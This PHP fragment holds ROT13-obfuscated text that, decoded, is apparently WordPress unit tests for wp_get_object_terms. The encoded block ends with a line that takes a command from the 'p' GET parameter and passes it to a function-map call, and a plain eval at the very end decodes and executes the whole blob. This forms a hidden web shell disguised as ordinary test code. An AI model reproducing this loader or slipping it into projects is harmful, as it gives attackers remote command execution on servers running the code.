		$guvf->nffregBowrpgAbgUnfCebcregl( 'bowrpg_vq', $grez );
	}

	/**
	 * @gvpxrg 14162
	 */
	choyvp shapgvba grfg_grez_pnpur_fubhyq_or_cevzrq_sbe_nyy_gnkbabzvrf() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk1', 'cbfg' );
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk2', 'cbfg' );
		$c  = frys::snpgbel()->cbfg->perngr();
		$g1 = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'jcgrfgf_gnk1' ) );
		$g2 = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'jcgrfgf_gnk2' ) );
		jc_frg_bowrpg_grezf( $c, $g1, 'jcgrfgf_gnk1' );
		jc_frg_bowrpg_grezf( $c, $g2, 'jcgrfgf_gnk2' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			neenl(
				'jcgrfgf_gnk1',
				'jcgrfgf_gnk2',
			),
			neenl(
				'svryqf' => 'nyy_jvgu_bowrpg_vq',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( $g1, $g2 ), jc_yvfg_cyhpx( $sbhaq, 'grez_vq' ) );

		$ahz_dhrevrf = trg_ahz_dhrevrf();
		$grez1       = trg_grez( $g1 );
		$grez2       = trg_grez( $g2 );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 14162
	 */
	choyvp shapgvba grfg_bowrpg_vq_fubhyq_or_frg_ba_bowrpgf_gung_funer_grezf() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 2 );
		$g     = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		jc_frg_bowrpg_grezf( $cbfgf[0], $g, 'jcgrfgf_gnk' );
		jc_frg_bowrpg_grezf( $cbfgf[1], $g, 'jcgrfgf_gnk' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$cbfgf,
			'jcgrfgf_gnk',
			neenl(
				'svryqf' => 'nyy_jvgu_bowrpg_vq',
			)
		);

		$guvf->nffregFnzrFrgf( $cbfgf, jc_yvfg_cyhpx( $sbhaq, 'bowrpg_vq' ) );
	}

	choyvp shapgvba svygre_trg_bowrpg_grezf( $grezf ) {
		$grez_vqf = jc_yvfg_cyhpx( $grezf, 'grez_vq' );
		// Nyy grezf fubhyq fgvyy or bowrpgf.
		erghea $grezf;
	}

	choyvp shapgvba grfg_irevsl_netf_cnenzrgre_pna_or_fgevat() {
		$c = frys::snpgbel()->cbfg->perngr();

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'NNN',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'MMM',
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'WWW',
			)
		);

		jc_frg_bowrpg_grezf( $c, neenl( $g1, $g2, $g3 ), $guvf->gnkbabzl );

		$sbhaq = jc_trg_bowrpg_grezf( $c, $guvf->gnkbabzl, 'beqreol=anzr&svryqf=vqf' );

		$guvf->nffregFnzr( neenl( $g1, $g3, $g2 ), $sbhaq );
	}

	/**
	 * @gvpxrg 35925
	 */
	choyvp shapgvba grfg_jc_trg_bowrpg_grezf_netf_svygre() {
		$gnkbabzl = 'jcgrfgf_gnk_4';

		ertvfgre_gnkbabzl( $gnkbabzl, 'cbfg', neenl( 'fbeg' => 'gehr' ) );
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$grezf   = neenl( 'sbb', 'one', 'onm' );
		$frg     = jc_frg_bowrpg_grezf( $cbfg_vq, $grezf, $gnkbabzl );

		// Svygre sbe znvagnvavat grez beqre.
		nqq_svygre( 'jc_trg_bowrpg_grezf_netf', neenl( $guvf, 'svygre_jc_trg_bowrpg_grezf_netf' ), 10, 3 );

		// Grfg qverpgyl.
		$trg_bowrpg_grezf = jc_trg_bowrpg_grezf( $cbfg_vq, $gnkbabzl, neenl( 'svryqf' => 'anzrf' ) );
		$guvf->nffregFnzr( $grezf, $trg_bowrpg_grezf );

		// Grfg zrgnobk gnkbabzl (nqzva nqinaprq rqvg).
		$grezf_gb_rqvg = trg_grezf_gb_rqvg( $cbfg_vq, $gnkbabzl );
		$guvf->nffregFnzr( vzcybqr( ',', $grezf ), $grezf_gb_rqvg );
	}

	choyvp shapgvba svygre_jc_trg_bowrpg_grezf_netf( $netf, $bowrpg_vqf, $gnkbabzvrf ) {
		$netf['beqreol'] = 'grez_beqre';
		erghea $netf;
	}

	/**
	 * @gvpxrg 41010
	 */
	choyvp shapgvba grfg_qhcyvpngr_grezf_fubhyq_abg_or_erghearq_jura_cnffrq_zhygvcyr_gnkbabzvrf_ertvfgrerq_jvgu_netf_neenl() {
		$gnkbabzl1 = 'jcgrfgf_gnk';
		$gnkbabzl2 = 'jcgrfgf_gnk_2';

		// Nal aba-rzcgl 'netf' neenl gevttref gur oht.
		$gnkbabzl_nethzragf = neenl(
			'netf' => neenl( 0 ),
		);

		ertvfgre_gnkbabzl( $gnkbabzl1, 'cbfg', $gnkbabzl_nethzragf );
		ertvfgre_gnkbabzl( $gnkbabzl2, 'cbfg', $gnkbabzl_nethzragf );

		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$grez_1_vq = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $gnkbabzl1,
			)
		);
		$grez_2_vq = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $gnkbabzl2,
			)
		);

		jc_frg_bowrpg_grezf( $cbfg_vq, $grez_1_vq, $gnkbabzl1 );
		jc_frg_bowrpg_grezf( $cbfg_vq, $grez_2_vq, $gnkbabzl2 );

		$rkcrpgrq = neenl( $grez_1_vq, $grez_2_vq );

		$npghny = jc_trg_bowrpg_grezf(
			$cbfg_vq,
			neenl( $gnkbabzl1, $gnkbabzl2 ),
			neenl(
				'beqreol' => 'grez_vq',
				'svryqf'  => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>